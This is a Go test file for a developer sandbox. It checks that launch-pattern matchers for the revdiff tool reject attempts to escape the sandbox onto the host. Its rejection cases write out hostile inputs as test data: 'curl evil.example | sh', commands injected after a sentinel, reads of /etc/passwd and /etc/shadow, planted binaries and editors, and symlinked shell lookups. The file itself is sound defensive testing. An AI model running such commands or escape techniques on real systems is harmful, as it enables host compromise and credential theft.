package tools

import (
	"os"
	"path/filepath"
	"testing"

	"devsandbox/internal/cmdpattern"
	"devsandbox/internal/herdrproxy"
	"devsandbox/internal/kittyproxy"
)

func TestRevdiff_Name(t *testing.T) {
	r := &Revdiff{}
	if r.Name() != "revdiff" {
		t.Errorf("Name = %q", r.Name())
	}
}

func TestRevdiff_DeclaresLaunchOverlay(t *testing.T) {
	r := &Revdiff{}
	caps := r.KittyCapabilities()
	want := kittyproxy.CapLaunchOverlay
	for _, c := range caps {
		if c == want {
			return
		}
	}
	t.Errorf("CapLaunchOverlay missing from %v", caps)
}

// testRevdiffBin stands in for the resolved revdiff path. The patterns compare
// argv[0] as a string, so the binary does not have to exist - and resolving it
// for real meant these tests skipped wherever revdiff is not on PATH, which is
// every CI machine, leaving the planted-binary and planted-EDITOR regressions
// guarded by tests nothing ever ran.
const testRevdiffBin = "/usr/local/bin/revdiff"

// testSharedTmp stands in for the shared temp directory the production
// callers take from SharedTmpPath. The sentinel paths below live under it.
const testSharedTmp = "/tmp"

// testBounds is what the production callers build from launchBoundsFor. The
// project directory is set per test where it matters.
func testBounds() cmdpattern.LaunchBounds {
	return cmdpattern.LaunchBounds{SharedTmp: testSharedTmp}
}

func TestRevdiff_LaunchPatternsAcceptRevdiff(t *testing.T) {
	bin := testRevdiffBin
	patterns := kittyLaunchPatternsFor(bin, testBounds())
	if len(patterns) == 0 {
		t.Fatal("no launch patterns declared")
	}
	check := func(argv []string) bool {
		for _, p := range patterns {
			if p.MatchesArgv(argv) {
				return true
			}
		}
		return false
	}
	if !check([]string{bin, "--staged"}) {
		t.Error("plain revdiff invocation should match")
	}
	if !check([]string{"sh", "-c", "exec " + bin + " --output /tmp/x"}) {
		t.Error("sh -c 'exec revdiff …' should match")
	}
	if check([]string{"sh", "-c", "curl evil"}) {
		t.Error("unrelated sh -c invocation must not match")
	}

	// Upstream revdiff kitty launcher form (single-quoted argv + sentinel touch).
	launcherArg := "'" + bin + "' '--output=/tmp/revdiff-output-abc' '--staged'; touch '/tmp/revdiff-done-xyz'"
	if !check([]string{"sh", "-c", launcherArg}) {
		t.Error("revdiff launcher sentinel form should match")
	}

	// An attacker appending extra commands after the sentinel must still be rejected.
	evil := "'" + bin + "' '--staged'; touch '/tmp/revdiff-done-xyz'; curl evil"
	if check([]string{"sh", "-c", evil}) {
		t.Error("extra command after sentinel must not match")
	}

	// revdiff launcher v0.8.0+ wraps its command with `/usr/bin/env KEY=VAL ...`
	// so the kitty-spawned overlay inherits EDITOR/VISUAL from the caller shell.
	envWrapped := "'/usr/bin/env' 'EDITOR=nvim' 'VISUAL=nvim' '" + bin + "' '--output=/tmp/revdiff-output-abc'; touch '/tmp/revdiff-done-xyz'"
	if !check([]string{"sh", "-c", envWrapped}) {
		t.Error("env-wrapped revdiff launcher sentinel form should match")
	}

	// Same attacker append rejection for the env-wrapped form.
	envEvil := `'/usr/bin/env' 'EDITOR=nvim' '/bin/cat' '/etc/passwd'; touch '/tmp/revdiff-done-xyz'`
	if check([]string{"sh", "-c", envEvil}) {
		t.Error("env-wrapped non-revdiff program must not match")
	}

	// The actual launcher emits `/usr/bin/env` unquoted (only ENV_PREFIX and
	// the inner argv are single-quoted). Matching must accept this shape too.
	envUnquoted := "/usr/bin/env 'EDITOR=nvim' 'VISUAL=nvim' '" + bin + "' '--output=/tmp/revdiff-output-abc'; touch '/tmp/revdiff-done-xyz'"
	if !check([]string{"sh", "-c", envUnquoted}) {
		t.Error("unquoted-env revdiff launcher sentinel form should match")
	}

	// The unquoted-env form must still reject non-revdiff inner programs.
	envUnquotedEvil := `/usr/bin/env 'EDITOR=nvim' '/bin/cat' '/etc/passwd'; touch '/tmp/revdiff-done-xyz'`
	if check([]string{"sh", "-c", envUnquotedEvil}) {
		t.Error("unquoted-env non-revdiff program must not match")
	}

	// Bare `env` (PATH-relative) must not match when unquoted — only the
	// literal `/usr/bin/env` absolute prefix the launcher emits is accepted,
	// so attackers can't rely on $PATH shadowing.
	envBarePath := "env 'EDITOR=nvim' '" + bin + "' '--output=/tmp/x'; touch '/tmp/revdiff-done-xyz'"
	if check([]string{"sh", "-c", envBarePath}) {
		t.Error("bare `env` (no absolute path) must not match")
	}

	// An unquoted first token that isn't `/usr/bin/env` must not match.
	envUnquotedWrongProg := "/bin/curl 'EDITOR=nvim' '" + bin + "' '--output=/tmp/x'; touch '/tmp/revdiff-done-xyz'"
	if check([]string{"sh", "-c", envUnquotedWrongProg}) {
		t.Error("unquoted first token must be /usr/bin/env only")
	}
}

// TestRevdiff_LaunchPatternsRejectPlantedBinary is the regression test for the
// escape that motivated pinning ResolvedBin.
//
// The revdiff IPC directory is a write-through bind mounted at an identical
// path on the host and inside the sandbox, so a file the sandbox creates there
// is visible to the host at the same path. Matching argv[0] on basename alone
// accepted any path ending in "revdiff", so the sandbox could plant an
// executable there, name it in a launch request, and have the host run it as
// the host user. Every form below must be denied.
func TestRevdiff_LaunchPatternsRejectPlantedBinary(t *testing.T) {
	patterns := kittyLaunchPatternsFor(testRevdiffBin, testBounds())
	if len(patterns) == 0 {
		t.Fatal("no launch patterns declared")
	}
	check := func(argv []string) bool {
		for _, p := range patterns {
			if p.MatchesArgv(argv) {
				return true
			}
		}
		return false
	}

	// A plausible shared-temp path: $HOME/.cache/devsandbox/tmp/<session>.
	planted := filepath.Join(
		SharedTmpPath(os.Getenv("HOME"), "/some/sandbox/home"), "revdiff",
	)

	tests := []struct {
		name string
		argv []string
	}{
		{
			name: "direct invocation of planted binary",
			argv: []string{planted, "--staged"},
		},
		{
			name: "planted binary via sh -c",
			argv: []string{"sh", "-c", "exec " + planted + " --output /tmp/x"},
		},
		{
			name: "planted binary in sentinel launcher form",
			argv: []string{"sh", "-c", "'" + planted + "' '--output=/tmp/o'; touch '/tmp/revdiff-done-xyz'"},
		},
		{
			name: "planted binary in env-wrapped sentinel form",
			argv: []string{"sh", "-c", "/usr/bin/env 'EDITOR=nvim' '" + planted + "' '--output=/tmp/o'; touch '/tmp/revdiff-done-xyz'"},
		},
		{
			name: "planted binary in a plain temp directory",
			argv: []string{"/tmp/revdiff", "--staged"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if check(tt.argv) {
				t.Errorf("launch pattern accepted a planted binary: %q", tt.argv)
			}
		})
	}
}

// herdrTail reproduces the launcher's write_rc_cmd output.
func herdrTail(sentinel string) string {
	q := "'" + sentinel + "'"
	return "; rc=$?; printf \"%s\" \"$rc\" > " + q + ".tmp && mv -f " + q + ".tmp " + q
}

func TestRevdiff_HerdrCapabilities(t *testing.T) {
	r := &Revdiff{}
	caps := r.HerdrCapabilities()
	if len(caps) != 1 || caps[0] != herdrproxy.CapLaunchOverlay {
		t.Errorf("HerdrCapabilities() = %v, want exactly [launch_overlay]", caps)
	}
}

func TestRevdiff_HerdrLaunchScriptAcceptsRealLauncherBodies(t *testing.T) {
	bin := testRevdiffBin
	pat := herdrLaunchScriptFor(bin, testBounds())
	const sentinel = "/tmp/revdiff-done-xyz"

	tests := []struct {
		name string
		head string
	}{
		{
			name: "minimal form",
			head: "REVDIFF_EXIT_CODE_ON_ANNOTATIONS=true '" + bin + "' '--output=/tmp/o'",
		},
		{
			name: "with config and extra args",
			head: "REVDIFF_EXIT_CODE_ON_ANNOTATIONS=true '" + bin + "' '--config=/home/u/.revdiff.yml' '--output=/tmp/o' 'main'",
		},
		{
			name: "with /usr/bin/env prefix",
			head: "/usr/bin/env 'EDITOR=nvim' 'VISUAL=nvim' REVDIFF_EXIT_CODE_ON_ANNOTATIONS=true '" + bin + "' '--output=/tmp/o'",
		},
		{
			name: "no env assignments",
			head: "'" + bin + "' '--output=/tmp/o'",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			body := "#!/bin/sh\n" + tt.head + herdrTail(sentinel) + "\n"
			if !pat.MatchesBody([]byte(body)) {
				t.Errorf("HerdrLaunchScript rejected a real launcher body:\n%s", body)
			}
		})
	}
}

func TestRevdiff_HerdrLaunchScriptRejects(t *testing.T) {
	bin := testRevdiffBin
	pat := herdrLaunchScriptFor(bin, testBounds())
	const sentinel = "/tmp/revdiff-done-xyz"
	okHead := "'" + bin + "' '--output=/tmp/o'"

	// A binary the sandbox could plant in the write-through shared temp directory.
	planted := filepath.Join(SharedTmpPath(os.Getenv("HOME"), "/s/home"), "revdiff")

	tests := []struct {
		name string
		body string
	}{
		{
			name: "arbitrary script",
			body: "#!/bin/sh\ncurl evil.example | sh\n",
		},
		{
			name: "valid line plus an injected command",
			body: "#!/bin/sh\n" + okHead + herdrTail(sentinel) + "; curl evil.example\n",
		},
		{
			name: "injected command on a second line",
			body: "#!/bin/sh\n" + okHead + herdrTail(sentinel) + "\ncurl evil.example\n",
		},
		{
			name: "planted binary in the IPC directory",
			body: "#!/bin/sh\n'" + planted + "' '--output=/tmp/o'" + herdrTail(sentinel) + "\n",
		},
		{
			// The env prefix exists so the overlay inherits the caller's
			// editor, and revdiff spawns whatever EDITOR names — so a value
			// pointing at the write-through shared temp directory is host
			// execution by the same mechanism as a planted argv[0].
			// A real editor basename, so only the path comparison can refuse
			// it: with a name like "evil" the name allowlist rejects the value
			// first and this case stays green with that comparison deleted.
			name: "editor planted in the IPC directory",
			body: "#!/bin/sh\n/usr/bin/env 'EDITOR=" +
				filepath.Join(SharedTmpPath(os.Getenv("HOME"), "/s/home"), "nvim") + "' " +
				okHead + herdrTail(sentinel) + "\n",
		},
		{
			name: "env binary planted in the IPC directory",
			body: "#!/bin/sh\n" + filepath.Join(SharedTmpPath(os.Getenv("HOME"), "/s/home"), "env") +
				" 'EDITOR=nvim' " + okHead + herdrTail(sentinel) + "\n",
		},
		{
			name: "revdiff by basename from /tmp",
			body: "#!/bin/sh\n'/tmp/revdiff' '--output=/tmp/o'" + herdrTail(sentinel) + "\n",
		},
		{
			name: "different program entirely",
			body: "#!/bin/sh\n'/bin/cat' '/etc/shadow'" + herdrTail(sentinel) + "\n",
		},
		{
			name: "no sentinel clause",
			body: "#!/bin/sh\n" + okHead + "\n",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if pat.MatchesBody([]byte(tt.body)) {
				t.Errorf("HerdrLaunchScript accepted a body it must reject:\n%s", tt.body)
			}
		})
	}
}

// TestRevdiff_HerdrLaunchScriptRejectsEditorFromProjectDir pins the second way
// a program name reaches a file the sandbox wrote. The shared temp directory is
// the obvious one; the project tree is the quiet one, because nothing in the
// value names it - the host's own PATH does, whenever a virtualenv, a
// node_modules/.bin or a `bin` direnv adds is active in the directory the
// terminal was started in.
func TestRevdiff_HerdrLaunchScriptRejectsEditorFromProjectDir(t *testing.T) {
	t.Setenv("EDITOR", "")
	t.Setenv("VISUAL", "")

	projectDir := t.TempDir()
	plantedBin := filepath.Join(projectDir, ".venv", "bin")
	if err := os.MkdirAll(plantedBin, 0o700); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	if err := os.WriteFile(filepath.Join(plantedBin, "nvim"), []byte("#!/bin/sh\n"), 0o700); err != nil {
		t.Fatalf("plant editor: %v", err)
	}
	t.Setenv("PATH", plantedBin+string(os.PathListSeparator)+os.Getenv("PATH"))

	// Synthetic roots, so neither bound covers the planted binary by accident:
	// t.TempDir() sits under /tmp whenever TMPDIR is unset, and testSharedTmp is
	// /tmp - which would turn the "outside every bound" case below into a
	// rejection that looks like the rule working.
	const (
		syntheticSharedTmp  = "/run/devsandbox-shared"
		syntheticProjectDir = "/run/devsandbox-project"
		sentinel            = syntheticSharedTmp + "/revdiff-done-xyz"
	)
	body := "#!/bin/sh\n/usr/bin/env 'EDITOR=nvim' '" + testRevdiffBin + "' '--output=/tmp/o'" +
		herdrTail(sentinel) + "\n"

	bounded := herdrLaunchScriptFor(testRevdiffBin, cmdpattern.LaunchBounds{
		SharedTmp:  syntheticSharedTmp,
		ProjectDir: projectDir,
	})
	if bounded.MatchesBody([]byte(body)) {
		t.Error("accepted EDITOR=nvim while the host's PATH resolves nvim inside the project tree")
	}

	// Setting the host's own EDITOR to the same name must not buy it past the
	// check: the value is host-derived, the file it names is not.
	t.Setenv("EDITOR", "nvim")
	if bounded.MatchesBody([]byte(body)) {
		t.Error("accepted the host's own EDITOR=nvim while the host's PATH resolves nvim inside the project tree")
	}
	t.Setenv("EDITOR", "")

	unbounded := herdrLaunchScriptFor(testRevdiffBin, cmdpattern.LaunchBounds{
		SharedTmp:  syntheticSharedTmp,
		ProjectDir: syntheticProjectDir,
	})
	if !unbounded.MatchesBody([]byte(body)) {
		t.Error("rejected an editor resolving outside every bound")
	}
}

// TestRevdiff_HostShellTrusted covers the wrapping shell the kitty patterns
// accept by spelling. `sh` is resolved by the terminal that runs it, so a PATH
// reaching into the project tree makes the sandbox the supplier of the
// interpreter - and the payload is forwarded to kitty verbatim, so denying
// every launch is the only answer available.
func TestRevdiff_HostShellTrusted(t *testing.T) {
	resolved, err := cmdpattern.ResolveProgram("sh")
	if err != nil {
		t.Skipf("sh not resolvable on this host: %v", err)
	}

	if err := hostShellTrusted(cmdpattern.LaunchBounds{SharedTmp: testSharedTmp, ProjectDir: t.TempDir()}); err != nil {
		t.Errorf("hostShellTrusted rejected an ordinary host shell: %v", err)
	}

	bounds := cmdpattern.LaunchBounds{SharedTmp: testSharedTmp, ProjectDir: filepath.Dir(resolved)}
	if err := hostShellTrusted(bounds); err == nil {
		t.Errorf("hostShellTrusted accepted `sh` resolving to %s, inside a directory the sandbox can write", resolved)
	}
}

// TestRevdiff_HostShellTrustedRejectsSymlinkedLookup covers the spelling the
// resolved path alone cannot see. `$PROJECT/bin` on PATH is the case
// LaunchBounds exists for, and a `sh` symlink there resolves *out* of the
// project tree - so a check that looks only at the symlink target reports a
// shell nothing untrusted supplies, while the file the terminal will actually
// open is the link, which the sandbox can repoint or replace at any point
// before the launch.
func TestRevdiff_HostShellTrustedRejectsSymlinkedLookup(t *testing.T) {
	realSh, err := cmdpattern.ResolveProgram("sh")
	if err != nil {
		t.Skipf("sh not resolvable on this host: %v", err)
	}

	projectDir := t.TempDir()
	projectBin := filepath.Join(projectDir, "bin")
	if err := os.MkdirAll(projectBin, 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	if err := os.Symlink(realSh, filepath.Join(projectBin, "sh")); err != nil {
		t.Fatalf("symlink: %v", err)
	}
	t.Setenv("PATH", projectBin+string(os.PathListSeparator)+os.Getenv("PATH"))

	bounds := cmdpattern.LaunchBounds{SharedTmp: testSharedTmp, ProjectDir: projectDir}
	if err := hostShellTrusted(bounds); err == nil {
		t.Errorf("hostShellTrusted accepted `sh` found at %s, a path the sandbox can replace, because it resolves to %s",
			filepath.Join(projectBin, "sh"), realSh)
	}
}

// TestRevdiff_ResolveRevdiffBinRejectsBoundInstall covers the pinned binary
// itself. ResolveProgram says which file the name means on the host, not who may
// rewrite it - and the project tree is bound read-write at the path the host
// knows it by, so a revdiff resolving inside it pins the pattern to bytes the
// sandbox chooses.
func TestRevdiff_ResolveRevdiffBinRejectsBoundInstall(t *testing.T) {
	projectDir := t.TempDir()
	projectBin := filepath.Join(projectDir, "bin")
	if err := os.MkdirAll(projectBin, 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	planted := filepath.Join(projectBin, "revdiff")
	if err := os.WriteFile(planted, []byte("#!/bin/sh\n"), 0o755); err != nil {
		t.Fatalf("write: %v", err)
	}
	t.Setenv("PATH", projectBin)

	bounds := cmdpattern.LaunchBounds{SharedTmp: testSharedTmp, ProjectDir: projectDir}
	if _, err := resolveRevdiffBin(bounds); err == nil {
		t.Errorf("resolveRevdiffBin pinned %s, which the sandbox can write", planted)
	}

	// The counterweight: the same lookup outside every bound must still resolve,
	// or the check degenerates into denying every install.
	if _, err := resolveRevdiffBin(cmdpattern.LaunchBounds{SharedTmp: testSharedTmp}); err != nil {
		t.Errorf("resolveRevdiffBin rejected a revdiff outside every bound: %v", err)
	}
}
